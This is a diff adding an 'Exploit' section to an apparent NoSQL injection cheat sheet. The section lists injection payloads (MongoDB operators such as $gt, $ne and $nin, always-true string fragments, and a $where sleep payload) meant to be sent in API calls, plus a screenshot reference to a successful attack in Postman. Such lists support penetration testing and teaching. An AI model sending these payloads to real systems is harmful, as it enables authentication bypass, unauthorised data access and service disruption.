@@ -1,5 +1,33 @@
 # NoSQL Injection
+
+
 ## Exploit
+* The following are common NoSQL metacharacters you could send in an API call to manipulate the database:
+```bash
+$gt
+{"$gt":""}
+{"$gt":-1}
+$ne
+{"$ne":""}
+{"$ne":-1}
+$nin
+{"$nin":1}
+{"$nin":[1]}
+|| '1'=='1
+//
+||'a'\\'a
+'||'1'=='1';//
+'/{}:
+'"\;{}
+'"\/$[].>
+{"$where": "sleep(1000)"}
+```
+
+* **Successful NoSQL injection attack using Postman:**
+![nosql](https://github.com/user-attachments/assets/3dd58830-ea8e-4444-b518-0889951a4779)
+
+
+
 **PHP**
 
 The exploits are based in adding an Operator
